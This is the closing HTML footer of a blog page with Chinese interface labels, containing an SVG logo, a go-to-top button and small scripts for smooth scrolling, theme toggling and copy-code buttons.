                d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
        </svg>
    </a>
</div>

  </footer>
</article>
    </main>
    
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = '复制';

        function copyingDone() {
            copybutton.innerHTML = '已复制！';
            setTimeout(() => {
                copybutton.innerHTML = '复制';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
